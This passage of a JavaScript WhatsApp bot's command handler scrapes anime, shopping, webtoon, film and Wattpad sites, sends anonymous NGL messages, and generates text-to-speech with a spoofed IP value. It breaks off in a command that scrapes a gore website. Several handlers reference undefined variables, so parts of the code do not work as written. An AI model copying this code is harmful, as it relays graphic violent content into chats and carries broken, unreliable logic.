      let statusTournament =
        clans.tournaments[statusTournamentName];

      let statusText = `*Tournament Status ${statusTournamentName}:*\n\n`;
      statusText += `Status: ${statusTournament.status}\n`;
      statusText += `Participants: ${statusTournament.participants.join(", ")}\n\n`;
      statusText += `Match List:\n`;
      statusTournament.matches.forEach((match, index) => {
        statusText += `${index + 1}. ${match.clan1} vs ${match.clan2} - ${match.status === "completed" ? "Completed" : "Pending"}\n`;
      });

      await m.reply(statusText.trim());
      break;

    default:
      await m.reply(
        "Invalid tournament command. Use create, join, start, or status.",
      );
      break;
  }
  break;

default:
  await m.reply(
    "Unknown command. Please use create, join, approve, war, list, leave, delete, member, missions, task, upgrade, or tournament.",
  );
  break;
}
}
break;
case 'q': case 'quoted': {
if (!m.quoted) return reply('Reply the Message!!')
let Lorenzoquotx = await David.serializeM(await m.getQuotedObj())
if (!Lorenzoquotx.quoted) return reply('The message you are replying to is not sent by the bot')
await Lorenzoquotx.quoted.copyNForward(m.chat, true)
}
break

case 'kiryuu': {
async function skiryu(query) {
	return new Promise((resolve, reject) => {
		axios.get('https://kiryuu.id/?s=' + query)
			.then(({
				data
			}) => {
				const $ = cheerio.load(data)
				const result = [];
				const linkk = [];
				const judull = [];
				const thumb = [];
				const rating = [];
				$('div.bsx > a').each(function(a, b) {
					linkk.push($(b).attr('href'))
					judull.push($(b).attr('title'))
					thumb.push($(b).find('img').attr('src').split('?resize')[0])
				})
				$('div.rating > div.numscore').each(function(c, d) {
					let rate = $(d).text();
					rating.push(rate)
				})
				for (let i = 0; i < linkk.length; i++) {
					result.push({
						Title: judull[i],
						rating: rating[i],
						thumb: thumb[i],
						link: linkk[i]
					})
				}
				resolve(result)
			})
			.catch(reject)
	})
}
if (!text) return m.reply('```Enter the anime you want to search for!!\n```')
m.reply(mess.wait)
let results = await skiryu(text)
//wm senn
if (results.length > 0) {
let message = `Search results for <${text}>\n\n`;
//wm senn
results.forEach((result, index) => {
message += `*${index + 1}.* *Title:* ${result.judul}\n*Rating:* ${anime.rating}\n*Link:* ${anime.link}\n\n\n`;
 });
//wm senn
David.sendMessage(m.chat, { image: { url: results[0].thumb}, caption: message }, { quoted: m })
//wm senn
 } else {
m.reply('The anime you provided does not exist..');
}
}
break
case '9anime': {
if (!q) return m.reply(`_anime name?_`)
const axios = require('axios');
const cheerio = require('cheerio');
// wm avz
async function AvoskyZV(keyword, m) {
  try {
// wm avz
    const searchUrl = `https://9animetv.to/search?keyword=${encodeURIComponent(keyword)}`;
// wm avz
    const { data } = await axios.get(searchUrl);
    const $ = cheerio.load(data);
// wm avz
    const animeList = [];
    // wm avz
    $('.flw-item').each((index, element) => {
      const titleElement = $(element).find('.film-name a');
      const title = titleElement.text().trim();
      const link = titleElement.attr('href');
// wm avz
      const imageUrl = $(element).find('.film-poster-img').attr('data-src');
      animeList.push({
        title,
        link: `https://9animetv.to${link}`,
        imageUrl
      });
    });
// wm avz
    if (animeList.length > 0) {
// wm avz
      let AvoskyZ = `Hasil pencarian untuk '${keyword}':\n\n`;
      animeList.forEach(anime => {
        AvoskyZ += `*Title:* ${anime.title}\n`;
        AvoskyZ += `*Link:* ${anime.link}\n`;
        AvoskyZ += `*Image URL:* ${anime.imageUrl}\n\n`;
      });
      m.reply(AvoskyZ);
    } else {
      m.reply(`Anime with search '${keyword}' not found`);
    }
// wm avz
  } catch (error) {
    console.error('Error:', error);
    m.reply('Error Occurred Again.');
  }
}
AvoskyZV(`${encodeURIComponent(text)}`, m);
}
break

case 'bukalapak':{
//wm senn
async function BukaLapak(search) {
  return new Promise(async (resolve, reject) => {
    try {
      const { data } = await axios.get(`https://www.bukalapak.com/products?from=omnisearch&from_keyword_history=false&search[keywords]=${search}&search_source=omnisearch_keyword&source=navbar`, {
        headers: {
          "user-agent": 'Mozilla/ 5.0(Windows NT 10.0; Win64; x64; rv: 108.0) Gecko / 20100101 Firefox / 108.0'
        }
      })
//wm senn
      const $ = cheerio.load(data);
      const dat = [];
      const b = $('a.slide > img').attr('src');
      $('div.bl-flex-item.mb-8').each((i, u) => {
        const a = $(u).find('observer-tracker > div > div');
//wm senn
        const img = $(a).find('div > a > img').attr('src');
        if (typeof img === 'undefined') return

        const link = $(a).find('.bl-thumbnail--slider > div > a').attr('href');
//wm senn
        const title = $(a).find('.bl-product-card__description-name > p > a').text().trim();
        const harga = $(a).find('div.bl-product-card__description-price > p').text().trim();
//wm senn
        const rating = $(a).find('div.bl-product-card__description-rating > p').text().trim();
        const terjual = $(a).find('div.bl-product-card__description-rating-and-sold > p').text().trim();
//wm senn
//wm senn
        const dari = $(a).find('div.bl-product-card__description-store > span:nth-child(1)').text().trim();
        const seller = $(a).find('div.bl-product-card__description-store > span > a').text().trim();
//wm senn 
        const link_sel = $(a).find('div.bl-product-card__description-store > span > a').attr('href');
//wm senn
//wm senn 
        const res_ = {
          title: title,
          rating: rating ? rating : 'No rating yet',
          terjual: terjual ? terjual : 'Not yet bought',
          harga: harga,
          image: img,
          link: link,
          store: {
            lokasi: dari,
            nama: seller,
            link: link_sel
          }
        };

        dat.push(res_);
      })
//wm senn
      if (dat.every(x => x === undefined)) return resolve({ developer: '@xorizn', mess: 'no result found' })
      resolve(dat)
    } catch (err) {
//wm senn
      console.error(err)
    }
  })
}
//wm senn
if (!text) return m.reply('```Enter the name of the item you want to search for.!!\n```')
m.reply(mess.wait)
let results = await BukaLapak(text)
//wm senn
if (results.length > 0) {
let message = `Search results for <${text}>\n\n`;
//wm senn
results.forEach((result, index) => {
message += `*${index + 1}.* *${result.title}*\nSold : ${result.harga}\nRating : ${result.rating}\nStore : ${result.store.nama}\nLokasi : ${result.store.lokasi}\nTerjual : ${result.terjual}\nLink : ${result.link}\n\n`;
 });
//wm senn
David.sendMessage(m.chat, { image: { url: results[0].image}, caption: message }, { quoted: m })
//wm senn
 } else {
m.reply('The item name you provided does not exist.');
}
//wm senn
}
break

case 'webtoon':{
async function webtoons(query) {
//wm senn
    return new Promise((resolve, reject) => {
        axios.get(`https://www.webtoons.com/id/search?keyword=${query}`)
//wm senn
            .then(({
                data
            }) => {
                const $ = cheerio.load(data)
                const hasil = [];
                 $('#content > div.card_wrap.search._searchResult > ul > li ').each(function(a, b) {
//wm senn
                    result = {
                    status: 200,
                    author: author,
                    Title: $(b).find('> a > div > p.subj').text(),
//wm senn
                    like: $(b).find('> a > div > p.grade_area > em').text(),
                    creator: $(b).find('> a > div > p.author').text(),
                    genre: $(b).find('> a > span').text(),
//wm senn
                    thumbnail: $(b).find('> a > img').attr('src'),
                    url: $(b).find('> a').attr('href')
                }
//wm senn
                hasil.push(result)
                })
//wm senn
                resolve(hasil)
            })
            .catch(reject)
    })
}
//wm senn
if (!text) return  m.reply('Enter the title you want to search for!!\nExample: .webtoon lookism');
let results = await webtoons(text)
if (results.length > 0) {
//wm senn
let message = `Results of the search ${text} :\n\n`;
results.forEach((result, index) => {
message += `Title : ${result.judul}\nLike : ${result.like}\nCreator : ${result.creator}\nGenre : ${result.genre}\nLink Baca : ${result.url}\n\n`;
 });
//wm senn
m.reply(message)
 } else {
m.reply('No result.');
}
//wm senn
}
break

case 'lk21': {
 const query = m.body.slice(5).trim();
 if (!query) {
 return m.reply("Please enter the title of the movie you want to search for..");
 }
// wm avz
 async function avzzzz(query) {
 try {
 const response = await axios.get(`https://tv.lk21official.my/search.php?s=${query}`);
 const html = response.data;
 const $ = cheerio.load(html);
 let results = [];
// wm avz
 $('.search-item').each((index, element) => {
 const title = $(element).find('h3 a').text().trim();
 const url = 'https://tv.lk21official.my' + $(element).find('h3 a').attr('href');
 const director = $(element).find('p strong:contains("Sutradara:")').parent().text().replace("Sutradara:", "").trim();
 const cast = $(element).find('p strong:contains("Bintang:")').parent().text().replace("Bintang:", "").trim();
// wm avz
 results.push({
 title,
 url,
 director,
 cast
 });
 });
// wm avz
 return results;
 } catch (error) {
 console.error(error);
 return [];
 }
 }
// wm avz
 const results = await avzzzz(query);
 if (results.length === 0) {
 return m.reply("No results found for your search: " + query);
 }
// wm avz
 let message = "Search results for: *" + query + "*\n\n";
 results.forEach((result) => {
 message += `Title: ${result.title}\n`;
 if (result.director) {
 message += `Director: ${result.director}\n`;
 }
 if (result.cast) {
 message += `Bintang: ${result.cast}\n`;
 }
 message += `Url: ${result.url}\n\n`;
 });
// wm avz
 m.reply(message);
}
break

case 'cita-cita':{
	let res = await fetch(
		"https://raw.githubusercontent.com/BadXyz/txt/main/citacita/citacita.json",
	);
	let json = await res.json();
    let ngawi = pickRandom(json)
	// Assuming fsizedoc is supposed to be a variable with the desired value
	let fsizedoc = 10; // Replace 10 with the actual value you want

	await David.sendMessage(
		m.chat,
		{
			audio: { url: ngawi },
			seconds: fsizedoc,
			ptt: true,
			mimetype: "audio/mpeg",
			fileName: "vn.mp3",
			waveform: [100, 0, 100, 0, 100, 0, 100],
		},
		{ quoted: m },
	);
};
break

case 'ngl': {
    if (!text || !text.includes('|')) {
        return reply(`*Usage:* .ngl <username>|<message>\n\n*Example:* .ngl davidcyril11|Hello there!`);
    }

    try {
        // Parse the username and message
        const [username, message] = text.split('|').map(t => t.trim());

        if (!username || !message) {
            return reply(`*Usage:* .ngl <username>|<message>\n\n*Example:* .ngl davidcyril11|Hello there!`);
        }

        // Construct the NGL link using the username
        const nglLink = `https://ngl.link/${username}`;

        // Call the NGL API
        const apiResponse = await axios.get(`https://api.siputzx.my.id/api/tools/ngl`, {
            params: { link: nglLink, text: message }
        });

        // Check API response
        if (apiResponse.status === 200 && apiResponse.data.status) {
            reply(`✅ *Message Sent Successfully!*\n\n📩 Message: "${message}"\n🔗 NGL Username: ${username}`);
        } else {
            reply(`❌ *Failed to send the message.* Please try again.`);
        }
    } catch (error) {
        console.error('Error in NGL command:', error);
        reply(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }
    break;
}



case 'wattpad':{
//wm senn
async function WattPad(judul) {
  return new Promise(async (resolve, reject) => {
    try {
//wm senn
      const { data } = await axios.get('https://www.wattpad.com/search/' + judul, {
        headers: {
          cookie: 'wp_id=d92aecaa-7822-4f56-b189-f8c4cc32825c; sn__time=j%3Anull; fs__exp=1; adMetrics=0; _pbkvid05_=0; _pbeb_=0; _nrta50_=0; lang=20; locale=id_ID; ff=1; dpr=1; tz=-8; te_session_id=1681636962513; _ga_FNDTZ0MZDQ=GS1.1.1681636962.1.1.1681637905.0.0.0; _ga=GA1.1.1642362362.1681636963; signupFrom=search; g_state={"i_p":1681644176441,"i_l":1}; RT=r=https%3A%2F%2Fwww.wattpad.com%2Fsearch%2Fanime&ul=1681637915624',
          'suer-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0'
        }
//wm senn
      }),
        $ = cheerio.load(data),
        limk = 'https://www.wattpad.com',
        _data = [];
//wm senn
      $('.story-card-container > ul.list-group.new-list-group > li.list-group-item').each(function (i, u) {
        let link = limk + $(u).find('a').attr('href')
//wm senn
        let judul = $(u).find('a > div > div.story-info > div.title').text().trim()
        let img = $(u).find('a > div > div.cover > img').attr('src')
        let desc = $(u).find('a > div > div.story-info > .description').text().replace(/\s+/g, ' ')
//wm senn
        let _doto = []
        $(u).find('a > div > div.story-info > .new-story-stats > .stats-item').each((u, i) => {
          _doto.push($(i).find('.icon-container > .tool-tip > .sr-only').text())
        })
//wm senn
        _data.push({
          title: judul,
          thumb: img,
          desc: desc,
          reads: _doto[0],
          vote: _doto[1],
          chapter: _doto[2],
          link: link,
        })
      })
//wm senn
      resolve(_data)
    } catch (err) {
      console.error(err)
    }
  })
}
//wm senn
if (!text) return m.reply('Enter the title you want to search for!!\nExample: .wattpad matchmaking')
//wm senn
let results = await WattPad(text)
//wm senn 
if (results.length > 0) {
let message = `Results of the search ${text} :\n\n`;
results.forEach((result, index) => {
message += `Title : ${result.title}\nChapter : ${result.chapter}\nVote : ${result.vote}\nTotal Reader : ${result.reads}\nDesc : ${result.desc}\nLink Baca : ${result.link}\n\n`;
 });
//wm senn
 David.sendMessage(m.chat, {image: {url: result[0].thumb}, caption: message}, {quoted: m})
//wm senn
 } else {
m.reply('No result.');
}
//wm senn
}
break
      case 'tts':
        case 'text2speech': {
            function ListVoiceArray(array) {
    const modifiedArray = array.map(item => {
        const modifiedName = item.replace(/(.+)-(.+)-(.+)Neural/, "$3 ($1-$2)");
        const language = item.split('-')[0];
        return `${modifiedName} ( ${language} )`;
    });

    return modifiedArray;
}

    let ListVoice = [
        "af-ZA-AdriNeural",
        "af-ZA-WillemNeural",
        "am-ET-AmehaNeural",
        "am-ET-MekdesNeural",
        "ar-AE-FatimaNeural",
        "ar-AE-HamdanNeural",
        "ar-BH-AliNeural",
        "ar-BH-LailaNeural",
        "ar-DZ-AminaNeural",
        "ar-DZ-IsmaelNeural",
        "ar-EG-SalmaNeural",
        "ar-EG-ShakirNeural",
        "ar-IQ-BasselNeural",
        "ar-IQ-RanaNeural",
        "ar-JO-SanaNeural",
        "ar-JO-TaimNeural",
        "ar-KW-FahedNeural",
        "ar-KW-NouraNeural",
        "ar-LB-LaylaNeural",
        "ar-LB-RamiNeural",
        "ar-LY-ImanNeural",
        "ar-LY-OmarNeural",
        "ar-MA-JamalNeural",
        "ar-MA-MounaNeural",
        "ar-OM-AbdullahNeural",
        "ar-OM-AyshaNeural",
        "ar-QA-AmalNeural",
        "ar-QA-MoazNeural",
        "ar-SA-HamedNeural",
        "ar-SA-ZariyahNeural",
        "ar-SY-AmanyNeural",
        "ar-SY-LaithNeural",
        "ar-TN-HediNeural",
        "ar-TN-ReemNeural",
        "ar-YE-MaryamNeural",
        "ar-YE-SalehNeural",
        "az-AZ-BabekNeural",
        "az-AZ-BanuNeural",
        "bg-BG-BorislavNeural",
        "bg-BG-KalinaNeural",
        "bn-BD-NabanitaNeural",
        "bn-BD-PradeepNeural",
        "bn-IN-BashkarNeural",
        "bn-IN-TanishaaNeural",
        "bs-BA-GoranNeural",
        "bs-BA-VesnaNeural",
        "ca-ES-AlbaNeural",
        "ca-ES-EnricNeural",
        "ca-ES-JoanaNeural",
        "cs-CZ-AntoninNeural",
        "cs-CZ-VlastaNeural",
        "cy-GB-AledNeural",
        "cy-GB-NiaNeural",
        "da-DK-ChristelNeural",
        "da-DK-JeppeNeural",
        "de-AT-IngridNeural",
        "de-AT-JonasNeural",
        "de-CH-JanNeural",
        "de-CH-LeniNeural",
        "de-DE-AmalaNeural",
        "de-DE-BerndNeural",
        "de-DE-ChristophNeural",
        "de-DE-ConradNeural",
        "de-DE-ElkeNeural",
        "de-DE-GiselaNeural",
        "de-DE-KasperNeural",
        "de-DE-KatjaNeural",
        "de-DE-KillianNeural",
        "de-DE-KlarissaNeural",
        "de-DE-KlausNeural",
        "de-DE-LouisaNeural",
        "de-DE-MajaNeural",
        "de-DE-RalfNeural",
        "de-DE-TanjaNeural",
        "el-GR-AthinaNeural",
        "el-GR-NestorasNeural",
        "en-AU-AnnetteNeural",
        "en-AU-CarlyNeural",
        "en-AU-DarrenNeural",
        "en-AU-DuncanNeural",
        "en-AU-ElsieNeural",
        "en-AU-FreyaNeural",
        "en-AU-JoanneNeural",
        "en-AU-KenNeural",
        "en-AU-KimNeural",
        "en-AU-NatashaNeural",
        "en-AU-NeilNeural",
        "en-AU-TimNeural",
        "en-AU-TinaNeural",
        "en-AU-WilliamNeural",
        "en-CA-ClaraNeural",
        "en-CA-LiamNeural",
        "en-GB-AbbiNeural",
        "en-GB-AlfieNeural",
        "en-GB-BellaNeural",
        "en-GB-ElliotNeural",
        "en-GB-EthanNeural",
        "en-GB-HollieNeural",
        "en-GB-LibbyNeural",
        "en-GB-MaisieNeural",
        "en-GB-MiaNeural",
        "en-GB-NoahNeural",
        "en-GB-OliverNeural",
        "en-GB-OliviaNeural",
        "en-GB-RyanNeural",
        "en-GB-SoniaNeural",
        "en-GB-ThomasNeural",
        "en-HK-SamNeural",
        "en-HK-YanNeural",
        "en-IE-ConnorNeural",
        "en-IE-EmilyNeural",
        "en-IN-NeerjaNeural",
        "en-IN-PrabhatNeural",
        "en-KE-AsiliaNeural",
        "en-KE-ChilembaNeural",
        "en-NG-AbeoNeural",
        "en-NG-EzinneNeural",
        "en-NZ-MitchellNeural",
        "en-NZ-MollyNeural",
        "en-PH-JamesNeural",
        "en-PH-RosaNeural",
        "en-SG-LunaNeural",
        "en-SG-WayneNeural",
        "en-TZ-ElimuNeural",
        "en-TZ-ImaniNeural",
        "en-US-AIGenerate1Neural",
        "en-US-AIGenerate2Neural",
        "en-US-AmberNeural",
        "en-US-AnaNeural",
        "en-US-AriaNeural",
        "en-US-AshleyNeural",
        "en-US-BlueNeural",
        "en-US-BrandonNeural",
        "en-US-ChristopherNeural",
        "en-US-CoraNeural",
        "en-US-DavisNeural",
        "en-US-ElizabethNeural",
        "en-US-EricNeural",
        "en-US-GuyNeural",
        "en-US-JacobNeural",
        "en-US-JaneNeural",
        "en-US-JasonNeural",
        "en-US-JennyMultilingualNeural",
        "en-US-JennyMultilingualV2Neural",
        "en-US-JennyNeural",
        "en-US-MichelleNeural",
        "en-US-MonicaNeural",
        "en-US-NancyNeural",
        "en-US-RogerNeural",
        "en-US-RyanMultilingualNeural",
        "en-US-SaraNeural",
        "en-US-SteffanNeural",
        "en-US-TonyNeural",
        "en-ZA-LeahNeural",
        "en-ZA-LukeNeural",
        "es-AR-ElenaNeural",
        "es-AR-TomasNeural",
        "es-BO-MarceloNeural",
        "es-BO-SofiaNeural",
        "es-CL-CatalinaNeural",
        "es-CL-LorenzoNeural",
        "es-CO-GonzaloNeural",
        "es-CO-SalomeNeural",
        "es-CR-JuanNeural",
        "es-CR-MariaNeural",
        "es-CU-BelkysNeural",
        "es-CU-ManuelNeural",
        "es-DO-EmilioNeural",
        "es-DO-RamonaNeural",
        "es-EC-AndreaNeural",
        "es-EC-LuisNeural",
        "es-ES-AbrilNeural",
        "es-ES-AlvaroNeural",
        "es-ES-ArnauNeural",
        "es-ES-DarioNeural",
        "es-ES-EliasNeural",
        "es-ES-ElviraNeural",
        "es-ES-EstrellaNeural",
        "es-ES-IreneNeural",
        "es-ES-LaiaNeural",
        "es-ES-LiaNeural",
        "es-ES-NilNeural",
        "es-ES-SaulNeural",
        "es-ES-TeoNeural",
        "es-ES-TrianaNeural",
        "es-ES-VeraNeural",
        "es-GQ-JavierNeural",
        "es-GQ-TeresaNeural",
        "es-GT-AndresNeural",
        "es-GT-MartaNeural",
        "es-HN-CarlosNeural",
        "es-HN-KarlaNeural",
        "es-MX-BeatrizNeural",
        "es-MX-CandelaNeural",
        "es-MX-CarlotaNeural",
        "es-MX-CecilioNeural",
        "es-MX-DaliaNeural",
        "es-MX-GerardoNeural",
        "es-MX-JorgeNeural",
        "es-MX-LarissaNeural",
        "es-MX-LibertoNeural",
        "es-MX-LucianoNeural",
        "es-MX-MarinaNeural",
        "es-MX-NuriaNeural",
        "es-MX-PelayoNeural",
        "es-MX-RenataNeural",
        "es-MX-YagoNeural",
        "es-NI-FedericoNeural",
        "es-NI-YolandaNeural",
        "es-PA-MargaritaNeural",
        "es-PA-RobertoNeural",
        "es-PE-AlexNeural",
        "es-PE-CamilaNeural",
        "es-PR-KarinaNeural",
        "es-PR-VictorNeural",
        "es-PY-MarioNeural",
        "es-PY-TaniaNeural",
        "es-SV-LorenaNeural",
        "es-SV-RodrigoNeural",
        "es-US-AlonsoNeural",
        "es-US-PalomaNeural",
        "es-UY-MateoNeural",
        "es-UY-ValentinaNeural",
        "es-VE-PaolaNeural",
        "es-VE-SebastianNeural",
        "et-EE-AnuNeural",
        "et-EE-KertNeural",
        "eu-ES-AinhoaNeural",
        "eu-ES-AnderNeural",
        "fa-IR-DilaraNeural",
        "fa-IR-FaridNeural",
        "fi-FI-HarriNeural",
        "fi-FI-NooraNeural",
        "fi-FI-SelmaNeural",
        "fil-PH-AngeloNeural",
        "fil-PH-BlessicaNeural",
        "fr-BE-CharlineNeural",
        "fr-BE-GerardNeural",
        "fr-CA-AntoineNeural",
        "fr-CA-JeanNeural",
        "fr-CA-SylvieNeural",
        "fr-CH-ArianeNeural",
        "fr-CH-FabriceNeural",
        "fr-FR-AlainNeural",
        "fr-FR-BrigitteNeural",
        "fr-FR-CelesteNeural",
        "fr-FR-ClaudeNeural",
        "fr-FR-CoralieNeural",
        "fr-FR-DeniseNeural",
        "fr-FR-EloiseNeural",
        "fr-FR-HenriNeural",
        "fr-FR-JacquelineNeural",
        "fr-FR-JeromeNeural",
        "fr-FR-JosephineNeural",
        "fr-FR-MauriceNeural",
        "fr-FR-YvesNeural",
        "fr-FR-YvetteNeural",
        "ga-IE-ColmNeural",
        "ga-IE-OrlaNeural",
        "gl-ES-RoiNeural",
        "gl-ES-SabelaNeural",
        "gu-IN-DhwaniNeural",
        "gu-IN-NiranjanNeural",
        "he-IL-AvriNeural",
        "he-IL-HilaNeural",
        "hi-IN-MadhurNeural",
        "hi-IN-SwaraNeural",
        "hr-HR-GabrijelaNeural",
        "hr-HR-SreckoNeural",
        "hu-HU-NoemiNeural",
        "hu-HU-TamasNeural",
        "hy-AM-AnahitNeural",
        "hy-AM-HaykNeural",
        "id-ID-ArdiNeural",
        "id-ID-GadisNeural",
        "is-IS-GudrunNeural",
        "is-IS-GunnarNeural",
        "it-IT-BenignoNeural",
        "it-IT-CalimeroNeural",
        "it-IT-CataldoNeural",
        "it-IT-DiegoNeural",
        "it-IT-ElsaNeural",
        "it-IT-FabiolaNeural",
        "it-IT-FiammaNeural",
        "it-IT-GianniNeural",
        "it-IT-ImeldaNeural",
        "it-IT-IrmaNeural",
        "it-IT-IsabellaNeural",
        "it-IT-LisandroNeural",
        "it-IT-PalmiraNeural",
        "it-IT-PierinaNeural",
        "it-IT-RinaldoNeural",
        "ja-JP-AoiNeural",
        "ja-JP-DaichiNeural",
        "ja-JP-KeitaNeural",
        "ja-JP-MayuNeural",
        "ja-JP-NanamiNeural",
        "ja-JP-NaokiNeural",
        "ja-JP-ShioriNeural",
        "jv-ID-DimasNeural",
        "jv-ID-SitiNeural",
        "ka-GE-EkaNeural",
        "ka-GE-GiorgiNeural",
        "kk-KZ-AigulNeural",
        "kk-KZ-DauletNeural",
        "km-KH-PisethNeural",
        "km-KH-SreymomNeural",
        "kn-IN-GaganNeural",
        "kn-IN-SapnaNeural",
        "ko-KR-BongJinNeural",
        "ko-KR-GookMinNeural",
        "ko-KR-InJoonNeural",
        "ko-KR-JiMinNeural",
        "ko-KR-SeoHyeonNeural",
        "ko-KR-SoonBokNeural",
        "ko-KR-SunHiNeural",
        "ko-KR-YuJinNeural",
        "lo-LA-ChanthavongNeural",
        "lo-LA-KeomanyNeural",
        "lt-LT-LeonasNeural",
        "lt-LT-OnaNeural",
        "lv-LV-EveritaNeural",
        "lv-LV-NilsNeural",
        "mk-MK-AleksandarNeural",
        "mk-MK-MarijaNeural",
        "ml-IN-MidhunNeural",
        "ml-IN-SobhanaNeural",
        "mn-MN-BataaNeural",
        "mn-MN-YesuiNeural",
        "mr-IN-AarohiNeural",
        "mr-IN-ManoharNeural",
        "ms-MY-OsmanNeural",
        "ms-MY-YasminNeural",
        "mt-MT-GraceNeural",
        "mt-MT-JosephNeural",
        "my-MM-NilarNeural",
        "my-MM-ThihaNeural",
        "nb-NO-FinnNeural",
        "nb-NO-IselinNeural",
        "nb-NO-PernilleNeural",
        "ne-NP-HemkalaNeural",
        "ne-NP-SagarNeural",
        "nl-BE-ArnaudNeural",
        "nl-BE-DenaNeural",
        "nl-NL-ColetteNeural",
        "nl-NL-FennaNeural",
        "nl-NL-MaartenNeural",
        "pl-PL-AgnieszkaNeural",
        "pl-PL-MarekNeural",
        "pl-PL-ZofiaNeural",
        "ps-AF-GulNawazNeural",
        "ps-AF-LatifaNeural",
        "pt-BR-AntonioNeural",
        "pt-BR-BrendaNeural",
        "pt-BR-DonatoNeural",
        "pt-BR-ElzaNeural",
        "pt-BR-FabioNeural",
        "pt-BR-FranciscaNeural",
        "pt-BR-GiovannaNeural",
        "pt-BR-HumbertoNeural",
        "pt-BR-JulioNeural",
        "pt-BR-LeilaNeural",
        "pt-BR-LeticiaNeural",
        "pt-BR-ManuelaNeural",
        "pt-BR-NicolauNeural",
        "pt-BR-ValerioNeural",
        "pt-BR-YaraNeural",
        "pt-PT-DuarteNeural",
        "pt-PT-FernandaNeural",
        "pt-PT-RaquelNeural",
        "ro-RO-AlinaNeural",
        "ro-RO-EmilNeural",
        "ru-RU-DariyaNeural",
        "ru-RU-DmitryNeural",
        "ru-RU-SvetlanaNeural",
        "si-LK-SameeraNeural",
        "si-LK-ThiliniNeural",
        "sk-SK-LukasNeural",
        "sk-SK-ViktoriaNeural",
        "sl-SI-PetraNeural",
        "sl-SI-RokNeural",
        "so-SO-MuuseNeural",
        "so-SO-UbaxNeural",
        "sq-AL-AnilaNeural",
        "sq-AL-IlirNeural",
        "sr-Latn-RS-NicholasNeural",
        "sr-Latn-RS-SophieNeural",
        "sr-RS-NicholasNeural",
        "sr-RS-SophieNeural",
        "su-ID-JajangNeural",
        "su-ID-TutiNeural",
        "sv-SE-HilleviNeural",
        "sv-SE-MattiasNeural",
        "sv-SE-SofieNeural",
        "sw-KE-RafikiNeural",
        "sw-KE-ZuriNeural",
        "sw-TZ-DaudiNeural",
        "sw-TZ-RehemaNeural",
        "ta-IN-PallaviNeural",
        "ta-IN-ValluvarNeural",
        "ta-LK-KumarNeural",
        "ta-LK-SaranyaNeural",
        "ta-MY-KaniNeural",
        "ta-MY-SuryaNeural",
        "ta-SG-AnbuNeural",
        "ta-SG-VenbaNeural",
        "te-IN-MohanNeural",
        "te-IN-ShrutiNeural",
        "th-TH-AcharaNeural",
        "th-TH-NiwatNeural",
        "th-TH-PremwadeeNeural",
        "tr-TR-AhmetNeural",
        "tr-TR-EmelNeural",
        "uk-UA-OstapNeural",
        "uk-UA-PolinaNeural",
        "ur-IN-GulNeural",
        "ur-IN-SalmanNeural",
        "ur-PK-AsadNeural",
        "ur-PK-UzmaNeural",
        "uz-UZ-MadinaNeural",
        "uz-UZ-SardorNeural",
        "vi-VN-HoaiMyNeural",
        "vi-VN-NamMinhNeural",
        "wuu-CN-XiaotongNeural",
        "wuu-CN-YunzheNeural",
        "yue-CN-XiaoMinNeural",
        "yue-CN-YunSongNeural",
        "zh-CN-XiaochenNeural",
        "zh-CN-XiaohanNeural",
        "zh-CN-XiaomengNeural",
        "zh-CN-XiaomoNeural",
        "zh-CN-XiaoqiuNeural",
        "zh-CN-XiaoruiNeural",
        "zh-CN-XiaoshuangNeural",
        "zh-CN-XiaoxiaoNeural",
        "zh-CN-XiaoxuanNeural",
        "zh-CN-XiaoyanNeural",
        "zh-CN-XiaoyiNeural",
        "zh-CN-XiaoyouNeural",
        "zh-CN-XiaozhenNeural",
        "zh-CN-YunfengNeural",
        "zh-CN-YunhaoNeural",
        "zh-CN-YunjianNeural",
        "zh-CN-YunxiNeural",
        "zh-CN-YunxiaNeural",
        "zh-CN-YunyangNeural",
        "zh-CN-YunyeNeural",
        "zh-CN-YunzeNeural",
        "zh-CN-henan-YundengNeural",
        "zh-CN-liaoning-XiaobeiNeural",
        "zh-CN-shaanxi-XiaoniNeural",
        "zh-CN-shandong-YunxiangNeural",
        "zh-CN-sichuan-YunxiNeural",
        "zh-HK-HiuGaaiNeural",
        "zh-HK-HiuMaanNeural",
        "zh-HK-WanLungNeural",
        "zh-TW-HsiaoChenNeural",
        "zh-TW-HsiaoYuNeural",
        "zh-TW-YunJheNeural",
        "zu-ZA-ThandoNeural",
        "zu-ZA-ThembaNeural"
    ]
    let lister = ListVoiceArray(ListVoice)
    let readMore = String.fromCharCode(8206).repeat(4001);

    let query = `Input query!\n\n*Example:*\n${prefix + command} *108 | My Name Is Queen Anita*\n\n` + readMore + lister.map((v, index) => "  " + (index + 1) + ". " + v).join("\n");
    
    function getParts(array, index) {
    if (isNaN(index)) {
        index = Number(index);
        if (isNaN(index)) {
            return "Index must be a number";
        }
    }

    const text = array[index - 1];
    const language = getLanguage(text);
    return {
        short: language,
        long: text
    };
}

function getLanguage(text) {
    const parts = text.split("-");
    return parts.slice(0, 2).join("-");
}
            
async function generateVoice(Locale = "id-ID", Voice = "id-ID-ArdiNeural", Query) {
    const formData = new FormData();
    formData.append("locale", Locale);
    formData.append("content", `<voice name="${Voice}">${Query}</voice>`);
    formData.append("ip", '46.161.194.33');
    const response = await fetch('https://app.micmonster.com/restapi/create', {
        method: 'POST',
        body: formData
    });
    return Buffer.from(('data:audio/mpeg;base64,' + await response.text()).split(',')[1], 'base64');
};
    
    let text
    if (args.length >= 1) {
        text = args.slice(0).join(" ")
    } else if (m.quoted && m.quoted.text) {
        text = m.quoted.text
    } else return m.reply(query)
    let [atas, bawah] = text.split("|")
    if (!atas) return m.reply(query)
    if (!bawah) return m.reply(query)
    const {
        short,
        long
    } = getParts(ListVoice, atas);
    await m.reply(`Please Wait` + "\n" + long.replace(/(.+)-(.+)-(.+)Neural/, "$3 ($1-$2)"))

    try {
        let res = await generateVoice(short, long, bawah)
        if (res) await David.sendMessage(m.chat, {
        audio: res,
        mimetype: 'audio/mp4',
        ptt: true,
        waveform: [100, 0, 100, 0, 100, 0, 100]
    }, {
        quoted: m
    })
    } catch (e) {
        await m.reply(e)
    }
}
break




        case 'randomgore': {
function gore() {
	return new Promise((resolve, reject) => {
		const page = Math.floor(Math.random() * 228)
		axios.get('https://seegore.com/gore/page/' + page)
			.then((res) => {
				const $ = cheerio.load(res.data)
				const link = [];
				$('ul > li > article').each(function(a, b) {
					link.push({
						title: $(b).find('div.content > header > h2').text(),
						link: $(b).find('div.post-thumbnail > a').attr('href'),
						thumb: $(b).find('div.post-thumbnail > a > div > img').attr('src'),
